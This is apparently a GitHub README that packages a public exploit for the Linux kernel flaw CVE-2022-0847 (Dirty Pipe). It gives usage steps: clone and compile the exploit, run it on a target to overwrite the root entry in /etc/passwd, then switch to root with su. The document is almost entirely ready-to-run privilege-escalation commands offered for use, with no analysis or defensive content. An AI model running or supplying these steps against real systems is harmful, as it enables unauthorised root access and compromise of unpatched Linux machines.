# Dirty Pipe - CVE-2022-0847

This is simply the code and instructions for how to use Max Kellermann's exploit for CVE-2022-0847 (known as Dirty Pipe).

Please go to https://dirtypipe.cm4all.com/ to read more about how to exploit works!

## How to use
1. Download and compile the exploit binary
```
git clone https://github.com/0xIronGoat/dirty-pipe.git
cd dirty-pipe
gcc exploit.c -o exploit
```

2. On the target, run the binary
```
./exploit /etc/passwd 1 "${$(cat /etc/passwd)/root:x/oot:}"
```

3. Switch to root
```
su
```
![dirtypipe](https://user-images.githubusercontent.com/14928858/157273381-d48fa680-74d1-4b9c-bff9-5f5a108cd279.png)
